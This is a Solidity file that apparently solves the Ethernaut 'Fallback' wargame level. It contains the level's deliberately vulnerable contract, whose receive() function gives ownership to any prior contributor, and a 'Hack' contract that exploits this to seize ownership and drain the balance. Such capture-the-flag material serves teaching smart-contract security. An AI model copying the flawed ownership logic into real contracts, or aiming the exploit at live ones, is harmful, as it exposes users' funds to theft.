// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import '@openzeppelin/contracts/utils/math/SafeMath.sol';

/**
Look carefully at the contract's code below.

You will beat this level if

you claim ownership of the contract
you reduce its balance to 0
  Things that might help

How to send ether when interacting with an ABI
How to send ether outside of the ABI
Converting to and from wei/ether units (see help() command)
Fallback methods
**/
contract Fallback {

  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() {
    owner = payable(msg.sender);
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = payable(msg.sender);
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0, "checks failed");
    owner = payable(msg.sender);
  }
}

interface FallbackI {
  function contribute() external payable;
  function withdraw() external;
}

contract Hack {

  FallbackI fallback_contract;

  constructor(address _add){
    fallback_contract = FallbackI(_add);
  }

  function getBalance() public view returns(uint) {
    return address(this).balance;
  }
  
  function hack() public payable {
     require(msg.value > 10);
     fallback_contract.contribute{value: msg.value - 10}();
    (bool success,) = address(fallback_contract).call{value: 10}("");
    require(success, "Unable to send eth");
    fallback_contract.withdraw();
  }

   receive() external payable {
   }
  
}